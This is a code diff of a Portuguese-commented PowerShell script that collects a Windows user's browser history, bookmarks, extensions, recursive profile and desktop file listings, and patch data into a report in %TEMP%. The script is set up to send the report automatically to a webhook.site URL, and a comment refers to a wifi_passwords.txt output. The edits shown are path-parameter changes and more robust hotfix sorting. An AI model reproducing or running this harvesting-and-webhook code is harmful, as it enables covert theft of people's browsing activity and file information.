@@ -1,3 +1,4 @@
+
 # Deixe vazio ('') se não quiser enviar automaticamente para webhook
 $WebhookUrl = 'https://webhook.site/77d0d5d4-f7e9-43ac-810c-0bf2139be510'
 
@@ -6,7 +7,6 @@ $ExportDirDefault = Join-Path $env:TEMP 'p'
 # Nome do arquivo de saída (padrão: %TEMP%\wifi_passwords.txt)
 
 $OutputFileDefault = Join-Path $env:TEMP 'system_info.txt'
-
 function Get-SystemInfo {
     [CmdletBinding()]
     param(
@@ -60,7 +60,7 @@ function Get-SystemInfo {
     $invokeBrowserSQLite = {
         param([string]$Database,[string]$Query)
 
-        if(-not $sqliteType -or -not (Test-Path -LiteralPath $Database -PathType Leaf)) {
+        if(-not $sqliteType -or -not (Test-Path -Path $Database -PathType Leaf)) {
             return $null
         }
 
@@ -70,7 +70,7 @@ function Get-SystemInfo {
         $rd = $null
 
         try {
-            Copy-Item -LiteralPath $Database -Destination $tmp -Force -ErrorAction Stop
+            Copy-Item -Path $Database -Destination $tmp -Force -ErrorAction Stop
 
             if($sqliteProvider -eq 'System.Data.SQLite') {
                 $cn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tmp;Version=3;Read Only=True;")
@@ -92,7 +92,7 @@ function Get-SystemInfo {
             if($rd){ try { $rd.Dispose() } catch {} }
             if($cmd){ try { $cmd.Dispose() } catch {} }
             if($cn){ try { $cn.Close() } catch {}; try { $cn.Dispose() } catch {} }
-            Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue
+            Remove-Item -Path $tmp -Force -ErrorAction SilentlyContinue
         }
     }
 
@@ -332,8 +332,60 @@ function Get-SystemInfo {
         # 06. WINDOWS UPDATE
         # =====================================================================
         & $sec '## 06. WINDOWS UPDATE / PATCHES'
-        $hot = & $try { Get-HotFix -ErrorAction Stop | Sort-Object InstalledOn -Descending }
-        if($hot) { $hot | Select-Object -First 20 | ForEach-Object { & $add "  - $($_.HotFixID) | $($_.InstalledOn) | $($_.Description)" } }
+        # InstalledOn pode chegar como string inválida em alguns sistemas.
+        # Não usamos Sort-Object diretamente sobre InstalledOn porque isso pode
+        # provocar conversão automática para DateTime e interromper a coleta.
+        $hot = & $try {
+            $hotfixes = @(Get-HotFix -ErrorAction Stop)
+
+            $hotfixes | Sort-Object -Property @{
+                Expression = {
+                    $date = $null
+
+                    if($_.InstalledOn -is [datetime]) {
+                        $date = $_.InstalledOn
+                    }
+                    elseif($null -ne $_.InstalledOn -and [string]$_.InstalledOn -ne '') {
+                        try {
+                            $date = [datetime]::Parse(
+                                [string]$_.InstalledOn,
+                                [System.Globalization.CultureInfo]::CurrentCulture
+                            )
+                        }
+                        catch {
+                            try {
+                                $date = [datetime]::Parse(
+                                    [string]$_.InstalledOn,
+                                    [System.Globalization.CultureInfo]::InvariantCulture
+                                )
+                            }
+                            catch {}
+                        }
+                    }
+
+                    if($null -eq $date) {
+                        [datetime]::MinValue
+                    }
+                    else {
+                        $date
+                    }
+                }
+                Descending = $true
+            }
+        }
+
+        if($hot) {
+            $hot | Select-Object -First 20 | ForEach-Object {
+                $installed = if($null -ne $_.InstalledOn -and [string]$_.InstalledOn -ne '') {
+                    [string]$_.InstalledOn
+                }
+                else {
+                    '[data inválida/indisponível]'
+                }
+
+                & $add "  - $($_.HotFixID) | $installed | $($_.Description)"
+            }
+        }
 
         $wu = & $try {
             $session = New-Object -ComObject Microsoft.Update.Session
@@ -482,7 +534,7 @@ function Get-SystemInfo {
         & $add "Raiz: $env:USERPROFILE"
 
         $userItems = & $try {
-            Get-ChildItem -LiteralPath $env:USERPROFILE -Force -Recurse -ErrorAction SilentlyContinue |
+            Get-ChildItem -Path $env:USERPROFILE -Force -Recurse -ErrorAction SilentlyContinue |
                 Sort-Object FullName
         }
 
@@ -540,7 +592,7 @@ function Get-SystemInfo {
 
         $desktopRoot = [Environment]::GetFolderPath('Desktop')
         $desktop = & $try {
-            Get-ChildItem -LiteralPath $desktopRoot -Force -ErrorAction Stop |
+            Get-ChildItem -Path $desktopRoot -Force -ErrorAction Stop |
                 Sort-Object Name
         }
 
@@ -596,7 +648,7 @@ function Get-SystemInfo {
         )
 
         foreach($browser in $browserRoots) {
-            if(-not (Test-Path -LiteralPath $browser.UserRoot -PathType Container)) { continue }
+            if(-not (Test-Path -Path $browser.UserRoot -PathType Container)) { continue }
 
             & $add ''; & $add $browser.Name.ToUpper(); & $add ('-' * 78)
 
@@ -611,7 +663,7 @@ function Get-SystemInfo {
                     & $add ''; & $add "PERFIL: $($profile.Name)"
                     $historyDb = Join-Path $profile.FullName 'History'
 
-                    if(Test-Path -LiteralPath $historyDb -PathType Leaf) {
+                    if(Test-Path -Path $historyDb -PathType Leaf) {
                         if($sqliteType) {
                             $q = @"
 SELECT
@@ -648,10 +700,10 @@ LIMIT $BrowserEntries
                     }
 
                     $bookmark = Join-Path $profile.FullName 'Bookmarks'
-                    if(Test-Path -LiteralPath $bookmark -PathType Leaf) {
+                    if(Test-Path -Path $bookmark -PathType Leaf) {
                         & $add ''; & $add 'FAVORITOS:'
                         try {
-                            $json = Get-Content -LiteralPath $bookmark -Raw -Encoding UTF8 -ErrorAction Stop | ConvertFrom-Json
+                            $json = Get-Content -Path $bookmark -Raw -Encoding UTF8 -ErrorAction Stop | ConvertFrom-Json
                             $walkBookmark = {
                                 param($node)
                                 if($node.children) {
@@ -670,14 +722,14 @@ LIMIT $BrowserEntries
                     }
 
                     $extRoot = Join-Path $profile.FullName 'Extensions'
-                    if(Test-Path -LiteralPath $extRoot -PathType Container) {
+                    if(Test-Path -Path $extRoot -PathType Container) {
                         & $add ''; & $add 'EXTENSÕES / PLUGINS:'
                         $extensions = & $try { Get-ChildItem $extRoot -Directory -ErrorAction Stop }
                         foreach($ext in $extensions) {
                             $manifest = & $try { Get-ChildItem $ext.FullName -Filter manifest.json -Recurse -File -ErrorAction Stop | Select-Object -First 1 }
                             if($manifest) {
                                 try {
-                                    $m = Get-Content -LiteralPath $manifest.FullName -Raw -Encoding UTF8 -ErrorAction Stop | ConvertFrom-Json
+                                    $m = Get-Content -Path $manifest.FullName -Raw -Encoding UTF8 -ErrorAction Stop | ConvertFrom-Json
                                     $name = $m.name
                                     if($name -and $name -match '^__MSG_'){ $name = $ext.Name }
                                     & $add "  - $name | Versão: $($m.version) | ID: $($ext.Name)"
@@ -691,7 +743,7 @@ LIMIT $BrowserEntries
                 foreach($profile in $profiles) {
                     & $add ''; & $add "PERFIL: $($profile.Name)"
                     $places = Join-Path $profile.FullName 'places.sqlite'
-                    if(Test-Path -LiteralPath $places -PathType Leaf) {
+                    if(Test-Path -Path $places -PathType Leaf) {
                         if($sqliteType) {
                             $q = @"
 SELECT
@@ -726,10 +778,10 @@ LIMIT $BrowserEntries
                     }
 
                     $addons = Join-Path $profile.FullName 'extensions.json'
-                    if(Test-Path -LiteralPath $addons -PathType Leaf) {
+                    if(Test-Path -Path $addons -PathType Leaf) {
                         & $add ''; & $add 'EXTENSÕES / PLUGINS:'
                         try {
-                            $j = Get-Content -LiteralPath $addons -Raw -Encoding UTF8 -ErrorAction Stop | ConvertFrom-Json
+                            $j = Get-Content -Path $addons -Raw -Encoding UTF8 -ErrorAction Stop | ConvertFrom-Json
                             if($j.addons) {
                                 $j.addons | Where-Object { $_.active -or $_.userDisabled -eq $false } | ForEach-Object {
                                     & $add "  - $($_.defaultLocale.name) | Versão: $($_.version) | ID: $($_.id)"
@@ -756,16 +808,16 @@ LIMIT $BrowserEntries
         & $add ''; & $add $sep; & $add 'FIM DO RELATÓRIO'; & $add $sep
 
         if(-not $ExportDir) { $ExportDir = Split-Path -Path $OutputFile -Parent }
-        if($ExportDir -and -not (Test-Path -LiteralPath $ExportDir -PathType Container)) {
-            New-Item -LiteralPath $ExportDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
+        if($ExportDir -and -not (Test-Path -Path $ExportDir -PathType Container)) {
+            New-Item -Path $ExportDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
         }
 
         $outputParent = Split-Path -Path $OutputFile -Parent
-        if($outputParent -and -not (Test-Path -LiteralPath $outputParent -PathType Container)) {
-            New-Item -LiteralPath $outputParent -ItemType Directory -Force -ErrorAction Stop | Out-Null
+        if($outputParent -and -not (Test-Path -Path $outputParent -PathType Container)) {
+            New-Item -Path $outputParent -ItemType Directory -Force -ErrorAction Stop | Out-Null
         }
 
-        $sb.ToString() | Out-File -LiteralPath $OutputFile -Encoding UTF8 -Force -ErrorAction Stop
+        $sb.ToString() | Out-File -Path $OutputFile -Encoding UTF8 -Force -ErrorAction Stop
         Write-Host "Relatório salvo em: $OutputFile"
         return $OutputFile
     }
@@ -777,7 +829,6 @@ LIMIT $BrowserEntries
         $ErrorActionPreference = $oldErrorActionPreference
     }
 }
-
 
 
 ##############################################################################
